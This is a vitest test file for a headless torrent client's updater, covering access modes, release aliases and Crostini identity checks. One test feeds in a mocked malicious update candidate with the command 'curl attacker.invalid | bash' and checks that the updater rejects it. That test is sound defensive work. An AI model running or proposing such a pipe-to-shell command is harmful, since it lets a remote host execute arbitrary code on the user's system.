// @vitest-environment jsdom

import { afterEach, describe, expect, it, vi } from "vitest";

import { createHostedHostIntegration } from "./headless-updater";
import type { DesktopUpdater } from "./inspection/updater/types";

const openUpdaters: DesktopUpdater[] = [];

afterEach(() => {
  for (const updater of openUpdaters.splice(0)) updater.close();
});

describe("headless browser updater", () => {
  it("accepts the trusted-network credential-free access mode", async () => {
    const fetcher = vi
      .fn()
      .mockResolvedValueOnce(
        jsonResponse({
          status: "ok",
          build_id: "0.1.1",
          product: "rstorrent-headless",
          access_mode: "network_none",
        }),
      )
      .mockResolvedValueOnce(jsonResponse(releaseInfo()));
    const integration = await createHostedHostIntegration(
      new URL("https://rstorrent.example-tailnet.ts.net:8445"),
      fetcher,
    );
    expect(integration?.product).toBe("headless");
    expect(integration?.accessMode).toBe("network_none");
    if (integration?.updater !== undefined) openUpdaters.push(integration.updater);
  });

  it.each(["rstorrent", "jstorrent"])("reports LAN exposure and accepts the %s release alias", async (repository) => {
    const fetcher = vi
      .fn()
      .mockResolvedValueOnce(jsonResponse({
        status: "ok",
        build_id: "0.1.0",
        product: "rstorrent-headless",
        access_mode: "lan_none",
      }))
      .mockResolvedValueOnce(jsonResponse(releaseInfo()))
      .mockResolvedValueOnce(
        jsonResponse({
          version: "0.1.1",
          release_url:
            `https://github.com/kzahel/${repository}/releases/tag/headless-v0.1.1`,
          apply_command:
            "$HOME/.local/bin/rstorrent-headless update --apply",
        }),
      );
    const integration = await createHostedHostIntegration(
      new URL("http://192.168.1.20:3030"),
      fetcher,
    );
    expect(integration?.accessMode).toBe("lan_none");
    const updater = integration?.updater;
    expect(updater).toBeDefined();
    if (updater === undefined) return;
    openUpdaters.push(updater);
    expect(updater.getSnapshot().info).toEqual({
      version: "0.1.0",
      buildId: "0.1.0",
      target: "linux-gnu",
      arch: "x86_64",
      bundleType: "headless",
      checkPrivacy: "anonymous",
    });

    await updater.check("manual");
    expect(updater.getSnapshot().state).toEqual({
      phase: "available",
      version: "0.1.1",
      reason: "manual",
      manualApply: {
        command: "$HOME/.local/bin/rstorrent-headless update --apply",
        releaseUrl:
          `https://github.com/kzahel/${repository}/releases/tag/headless-v0.1.1`,
      },
    });
    expect(fetcher.mock.calls[2]?.[1]).toMatchObject({
      method: "POST",
      credentials: "same-origin",
      headers: { "X-Check-Reason": "manual" },
    });
    await updater.install();
    expect(updater.getSnapshot().state.phase).toBe("available");
  });

  it("rejects candidate command or release identity drift", async () => {
    const fetcher = vi
      .fn()
      .mockResolvedValueOnce(jsonResponse({
        status: "ok",
        build_id: "0.1.0",
        product: "rstorrent-headless",
        access_mode: "basic",
      }))
      .mockResolvedValueOnce(jsonResponse(releaseInfo()))
      .mockResolvedValueOnce(
        jsonResponse({
          version: "0.1.1",
          release_url: "https://attacker.invalid/release",
          apply_command: "curl attacker.invalid | bash",
        }),
      );
    const integration = await createHostedHostIntegration(
      new URL("https://torrent.example.test"),
      fetcher,
    );
    const updater = integration?.updater;
    expect(updater).toBeDefined();
    if (updater === undefined) return;
    openUpdaters.push(updater);
    await updater.check("manual");
    expect(updater.getSnapshot().state).toEqual({
      phase: "error",
      operation: "check",
      message: "Headless update candidate is invalid",
    });
  });

  it("recognizes exact Crostini identity without headless behavior", async () => {
    const fetcher = vi.fn().mockResolvedValueOnce(
      jsonResponse({
        status: "ok",
        build_id: "development",
        product: "rstorrent-crostini",
        launch_protocol: 1,
      }),
    );
    const integration = await createHostedHostIntegration(
      new URL("http://penguin.linux.test:3030"),
      fetcher,
    );
    expect(integration).toEqual({ product: "crostini", buildId: "development" });
    expect(fetcher).toHaveBeenCalledOnce();
  });

  it("rejects malformed Crostini identity", async () => {
    const fetcher = vi.fn().mockResolvedValueOnce(
      jsonResponse({
        status: "ok",
        build_id: "development",
        product: "rstorrent-crostini",
        launch_protocol: 2,
      }),
    );
    await expect(
      createHostedHostIntegration(
        new URL("http://penguin.linux.test:3030"),
        fetcher,
      ),
    ).rejects.toThrow("Crostini health identity is invalid");
    expect(fetcher).toHaveBeenCalledOnce();
  });
});

function releaseInfo() {
  return {
    version: "0.1.0",
    build_id: "0.1.0",
    target: "linux-gnu",
    arch: "x86_64",
    package: "headless",
    check_privacy: "anonymous",
  };
}

function jsonResponse(value: unknown): Response {
  return new Response(JSON.stringify(value), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
}
